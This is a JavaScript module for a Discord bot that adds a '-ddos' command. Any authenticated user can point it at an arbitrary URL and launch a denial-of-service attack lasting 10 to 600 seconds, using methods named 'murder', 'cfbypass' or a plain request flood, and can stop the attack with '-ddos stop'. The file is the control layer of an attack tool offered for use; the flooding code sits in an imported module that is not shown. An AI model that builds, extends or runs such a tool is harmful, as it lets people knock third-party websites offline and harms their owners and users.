const Discord = require("discord.js");

const authenticate = require('../../authentication/authenticate')

const launch = require('../../functions/launch')

var beingused = false;
var distributed_timeout 

async function stop_ddos_attack(message)
{
  clearTimeout(distributed_timeout)

  await launch({
    stop : 1
  })
  const DOSEmbed3 = new Discord.MessageEmbed()
  .setColor('#2C2F33')
  .setTitle('Attack has been stopped')
  .setDescription(`${message.author.tag} has stopped the ongoing attack.`)
  message.channel.send(DOSEmbed3);
}

module.exports= {
  name: 'ddos',
  category: 'security',
  description: 'Disturbed denial of service attack against a particular host.',
  run: async (client,message,args,guild) => {
    if(beingused && args[0].toLowerCase() == 'stop')
    {
      return stop_ddos_attack(message)
    }
    // MESSAGES
    if (!args[0] && !args[1]) {
      let muteinfoembed = new Discord.MessageEmbed()
        .setTitle("Command: ddos")
        .setDescription(
          `**Description:** Disturbed denial of service attack against a particular host.. \n` +
            "**Usage:**\n" +
            "-ddos [url] [time/s] [optional:murder/cfbypass/null (default : request)]\n" +
            "-ddos stop\n" 
        )
        .setColor("#2C2F33");
      message.channel.send(muteinfoembed);
  
      return;
    }

    let auth = await authenticate(message)
    if(!auth)
      return
    
    if(beingused)
    {
      const unsuccessfulembe = new Discord.MessageEmbed()
        .setTitle(`This command is being in use by someone else, please try again later.`)
        .setDescription(`You can stop it by using : -ddos stop`)
        .setColor("#2C2F33");
      return message.channel.send(unsuccessfulembe);
    }

    const expression = /https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)/gi;
    const regex = new RegExp(expression);

    if (!args[0].match(regex)) {
      const unsuccessfulembed = new Discord.MessageEmbed()
        .setTitle(`Please under a valid website URL.`)
        .setColor("#2C2F33");
      return message.channel.send(unsuccessfulembed);
    }

    const parsed_string = parseInt(args[1]);
    let time_out = Math.min(Math.floor(parsed_string), 600);

    if(time_out > 600 || time_out < 10 || isNaN(time_out))
    {
      const unsuccessfulembed2 = new Discord.MessageEmbed()
        .setTitle(`Please under a valid number between 10s and 600s.`)
        .setColor("#2C2F33");
      return message.channel.send(unsuccessfulembed2);
    }

    beingused = true

    let atkmethod = 3

    if(args[2])
    {
      switch(args[2].toLowerCase())
      {
        case 'murder' : {
          atkmethod = 2
          break;
        }
        case 'cfbypass' : {
          atkmethod = 1
          break;
        }
        case 'null' : {
          atkmethod = 0
          break;
        }
        default : {
          atkmethod = 3
        }
      }
    }
    
    await launch({
      target : args[0],
      time : time_out,
      method : atkmethod

    })
    const DOSEmbed2 = new Discord.MessageEmbed()
    .setColor('#2C2F33')
    .setTitle('Attack has been initiated')
    .setDescription(`${message.author.tag} has attacked ${args[0]} for ${time_out}s.`)

    message.channel.send(DOSEmbed2);
    time_out *= 1000;
    distributed_timeout = setTimeout( async () => { 
      stop_ddos_attack(message)
    }, time_out + 500);
  }
}
